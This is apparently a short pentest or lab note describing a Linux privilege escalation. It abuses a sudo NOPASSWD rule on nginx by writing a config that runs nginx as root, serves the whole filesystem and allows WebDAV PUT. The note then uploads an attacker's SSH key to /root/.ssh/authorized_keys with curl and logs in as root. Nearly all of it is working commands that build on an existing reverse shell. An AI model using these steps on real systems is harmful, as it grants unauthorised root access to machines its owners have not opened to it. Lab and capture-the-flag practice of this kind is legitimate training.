sudo -l gives NOPASSWD : /usr/sbin/nginx

Make sure target reverse shell is upgraded. [[4 Shell Upgrade]]

```
nano /tmp/pwn.conf
```

Paste this script in

```
user root;
worker_processes 4; 
pid /tmp/nginx.pid; 
events { 
		worker_connections 768;
} 
http { 
	server { 
		listen 1337; 
		root /; 
		autoindex on; 
		
		dav_methods PUT; 
	}
}
```

Verify that port 1337 is open
```
ss -tlpn
```

This should give us root writing access.

---

```
cd /tmp
```

```
ssh-keygen
```

EMPTY (ENTER)

EMPTY (ENTER)

Write this cmd in current unelevated reverse shell
```
curl -X PUT localhost:1337/root/.ssh/authorized_keys -d "$(cat root.pub)"
```

Now ssh into root through the same unelevated shell
```
ssh -i root root@localhost
```

